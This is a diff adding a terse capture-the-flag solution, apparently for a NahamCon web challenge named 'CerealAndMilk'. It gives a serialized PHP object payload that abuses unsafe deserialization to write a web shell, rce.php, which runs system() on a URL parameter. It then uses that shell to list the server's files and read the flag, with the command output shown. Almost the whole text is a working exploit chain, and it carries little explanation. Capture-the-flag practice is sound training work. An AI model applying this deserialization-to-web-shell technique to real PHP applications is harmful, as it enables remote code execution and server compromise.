@@ -1,0 +1,22 @@
+To make sure for fast deserialization happens, using arrays.
+
+php payload.php
+	O:13:"CerealAndMilk":3:{s:3:"log";a:1:{i:0;O:3:"log":2:{s:4:"logs";s:7:"rce.php";s:7:"request";s:30:"<?php system($_GET["cmd"]); ?>";}}s:6:"cereal";a:1:{i:0;s:8:"Frosties";}s:4:"milk";a:1:{i:0;s:4:"full";}}
+
+ Do not copy the last }. There should be only one at the end.
+
+ http://challenge.nahamcon.com:32710/rce.php?cmd=ls -al
+ 	total 36
+ 	drwxr-xr-x 1 apache apache 4096 Mar 15 07:27 .
+ 	drwxr-xr-x 1 root root 4096 Mar 12 00:42 ..
+ 	-rw-r--r-- 1 apache apache 45 Dec 2 21:45 index.html
+ 	-rw-r--r-- 1 apache apache 4577 Mar 12 00:41 index.php
+ 	-rw-r--r-- 1 apache apache 257 Mar 12 00:41 log.php
+ 	drwxr-xr-x 1 apache apache 4096 Mar 12 00:42 ndwbr7pVKNCrhs-CerealnMilk
+ 	-rw-r--r-- 1 apache apache 64 Mar 15 07:27 rce.php
+
+http://challenge.nahamcon.com:32710/rce.php?cmd=ls ndwbr7pVKNCrhs-CerealnMilk
+	flag.txt
+
+http://challenge.nahamcon.com:32710/rce.php?cmd=cat ndwbr7pVKNCrhs-CerealnMilk/flag.txt
+	flag{70385676892a2a813a666961ddd6f899}
